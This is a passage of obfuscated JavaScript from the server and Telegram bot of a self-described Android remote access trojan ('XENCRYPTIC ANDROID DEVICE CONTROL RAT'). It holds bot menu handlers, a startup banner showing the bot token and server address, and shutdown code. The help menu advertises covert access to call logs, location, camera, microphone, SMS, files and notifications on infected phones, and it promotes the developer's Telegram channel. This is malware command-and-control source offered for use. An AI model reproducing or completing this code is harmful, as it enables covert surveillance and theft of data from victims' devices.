+ "\">🌐 𝙎𝙀𝙍𝙑𝙀𝙍 𝘼𝘿𝘿𝙍𝙀𝙎𝙎</a>\n𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 𝘽𝙔: " + "@Xencryptic" + "\n    ";
  bot.sendMessage(_0x59230f, _0x131097, {
    'parse_mode': "HTML",
    'disable_web_page_preview': true
  });
});
bot.onText(/📈 𝙋𝙀𝙍𝙁𝙊𝙍𝙈𝘼𝙉𝘾𝙀/, _0xc25047 => {
  const _0x11b709 = _0xc25047.chat.id.toString();
  const _0x33e95b = "\n📈 <b>𝙋𝙀𝙍𝙁𝙊𝙍𝙈𝘼𝙉𝘾𝙀 𝙈𝙊𝙉𝙄𝙏𝙊𝙍</b>\n\n═══════════════════════════\n   𝙍𝙀𝘼𝙇-𝙏𝙄𝙈𝙀 𝙎𝙏𝘼𝙏𝙎\n═══════════════════════════\n\n<b>⚡ 𝙎𝙔𝙎𝙏𝙀𝙈 𝙇𝙊𝘼𝘿:</b>\n├ 𝘾𝙋𝙐 𝙐𝙨𝙖𝙜𝙚: " + (process.cpuUsage().system / 0xf4240).toFixed(0x2) + "𝙨\n├ 𝙈𝙚𝙢𝙤𝙧𝙮: " + (process.memoryUsage().heapUsed / 0x400 / 0x400).toFixed(0x2) + "𝙈𝘽\n├ 𝙐𝙥𝙩𝙞𝙢𝙚: " + Math.floor(process.uptime()) + "𝙨\n└ 𝙋𝙞𝙙: " + process.pid + "\n\n<b>📊 𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙄𝙊𝙉 𝙎𝙏𝘼𝙏𝙎:</b>\n├ 𝙏𝙤𝙩𝙖𝙡 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙤𝙣𝙨: " + clients.size + "\n├ 𝘼𝙘𝙩𝙞𝙫𝙚 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙤𝙣𝙨: " + clients.size + "\n└ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙍𝙖𝙩𝙚: 100%\n    ";
  bot.sendMessage(_0x11b709, _0x33e95b, {
    'parse_mode': 'HTML'
  });
});
bot.onText(/❓ 𝙃𝙀𝙇𝙋 & 𝙄𝙉𝙁𝙊/, _0x40436f => {
  const _0x5e299e = _0x40436f.chat.id.toString();
  const _0x97523c = "\n❓ <b>𝙃𝙀𝙇𝙋 & 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉</b>\n\n═══════════════════════════\n   𝑿𝑬𝑵𝑪𝑹𝒀𝑷𝑻𝑰𝑪 𝘼𝙉𝘿𝙍𝙊𝙄𝘿 𝘿𝙀𝙑𝙄𝘾𝙀 𝘾𝙊𝙉𝙏𝙍𝙊𝙇 𝙍𝘼𝙏\n═══════════════════════════\n\n<b>🎯 𝙁𝙀𝘼𝙏𝙐𝙍𝙀𝙎:</b>\n├ 📱 𝘿𝙚𝙫𝙞𝙘𝙚 𝙈𝙤𝙣𝙞𝙩𝙤𝙧𝙞𝙣𝙜\n├ 📞 𝘾𝙖𝙡𝙡 𝙇𝙤𝙜𝙨 𝘼𝙘𝙘𝙚𝙨𝙨\n├ 📍 𝙍𝙚𝙖𝙡-𝙩𝙞𝙢𝙚 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣\n├ 📷 𝘾𝙖𝙢𝙚𝙧𝙖 𝘾𝙤𝙣𝙩𝙧𝙤𝙡\n├ 🎤 𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝘼𝙘𝙘𝙚𝙨𝙨\n├ 💬 𝙎𝙈𝙎 𝙈𝙖𝙣𝙖𝙜𝙚𝙢𝙚𝙣𝙩\n├ 📂 𝙁𝙞𝙡𝙚 𝙀𝙭𝙥𝙡𝙤𝙧𝙚𝙧\n└ 🔔 𝙉𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘾𝙤𝙣𝙩𝙧𝙤𝙇\n\n<a href=\"https://t.me/XenCrypticMethods\">📢 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 𝘾𝙃𝘼𝙉𝙉𝙀𝙇</a>\n<a href=\"" + SERVER_ADDRESS + "\">🌐 𝙎𝙀𝙍𝙑𝙀𝙍 𝘼𝘿𝘿𝙍𝙀𝙎𝙎</a>\n𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 𝘽𝙔: " + "@Xencryptic" + "\n    ";
  bot.sendMessage(_0x5e299e, _0x97523c, {
    'parse_mode': "HTML",
    'disable_web_page_preview': true
  });
});
server.listen(SERVER_PORT, () => {
  console.log("\n╔═══════════════════════════════════════════════════════════════════════════╗\n║          🕸️ 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝑿𝑬𝑵𝑪𝑹𝒀𝑷𝑻𝑰𝑪 𝘼𝙉𝘿𝙍𝙊𝙄𝘿 𝘿𝙀𝙑𝙄𝘾𝙀 𝘾𝙊𝙉𝙏𝙍𝙊𝙇 𝙍𝘼𝙏 𝙋𝘼𝙉𝙀𝙇          ║\n╠═══════════════════════════════════════════════════════════════════════════╣\n║ 🚨 𝙎𝙔𝙎𝙏𝙀𝙈 𝙎𝙏𝘼𝙏𝙐𝙎: 🟢 𝙍𝙐𝙉𝙉𝙄𝙉𝙂 (𝙊𝙋𝙏𝙄𝙈𝙄𝙕𝙀𝘿)                                   ║\n╠═══════════════════════════════════════════════════════════════════════════╣\n║ 📡 𝙋𝙊𝙍𝙏: " + SERVER_PORT + "                                                       ║\n║ 🤖 𝘽𝙊𝙏: @" + bot.token.split(':')[0x0] + "_bot                                         ║\n║ 👨💻 𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍: " + "@XenCryptic" + "                                                   ║\n║ 🔗 𝘾𝙃𝘼𝙉𝙉𝙀𝙇: " + "https://t.me/XenCrypticMethods" + "                                                   ║\n║ 📊 𝘾𝙇𝙄𝙀𝙉𝙏𝙎: 0 𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙀𝘿                                                     ║\n╚═══════════════════════════════════════════════════════════════════════════╝\n    \n    🎯 𝙎𝙀𝙍𝙑𝙀𝙍 𝙁𝙀𝘼𝙏𝙐𝙍𝙀𝙎:\n    ├ ✅ 𝙒𝙚𝙗𝙎𝙤𝙘𝙠𝙚𝙩 𝙎𝙚𝙧𝙫𝙚𝙧\n    ├ ✅ 𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝘽𝙤𝙩 𝙄𝙣𝙩𝙚𝙜𝙧𝙖𝙩𝙞𝙤𝙉\n    ├ ✅ 𝙍𝙚𝙖𝙡-𝙩𝙞𝙢𝙚 𝘿𝙚𝙫𝙞𝙘𝙚 𝙈𝙤𝙣𝙞𝙩𝙤𝙧𝙞𝙣𝙜\n    ├ ✅ 6 𝙈𝙚𝙣𝙪 𝘽𝙪𝙩𝙩𝙤𝙣𝙨\n    ├ ✅ 𝘼𝙘𝙩𝙞𝙤𝙣 𝙈𝙚𝙣𝙪 𝙛𝙤𝙧 𝘿𝙚𝙫𝙞𝙘𝙚𝙨\n    └ ✅ 𝙋𝙚𝙧𝙛𝙤𝙧𝙢𝙖𝙣𝙘𝙚 𝙈𝙤𝙣𝙞𝙩𝙤𝙧𝙞𝙣𝙂\n    \n    🔑 𝙏𝙊𝙆𝙀𝙉: " + TELEGRAM_TOKEN.substring(0x0, 0xf) + "...\n    💬 𝘾𝙃𝘼𝙏 𝙄𝘿: " + CHAT_ID + "\n    🌐 𝘼𝘿𝘿𝙍𝙀𝙎𝙎: " + SERVER_ADDRESS + "\n    \n    🚀 𝙍𝙚𝙖𝙙𝙮 𝙛𝙤𝙧 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙤𝙣𝙨...\n    ");
});
process.on("SIGINT", () => {
  console.log("\n🔴 𝙎𝙃𝙐𝙏𝙏𝙄𝙉𝙂 𝘿𝙊𝙒𝙉 𝙎𝙀𝙍𝙑𝙀𝙍...");
  clearInterval(heartbeatInterval);
  clearInterval(keepAliveInterval);
  wss.clients.forEach(_0x5856e6 => {
    if (_0x5856e6.readyState === WebSocket.OPEN) {
      _0x5856e6.close();
    }
  });
  wss.close();
  server.close();
  bot.stopPolling();
  console.log("✅ 𝙎𝙀𝙍𝙑𝙀𝙍 𝙎𝙃𝙐𝙏𝘿𝙊𝙒𝙉 𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀");
  process.exit(0x0);
});
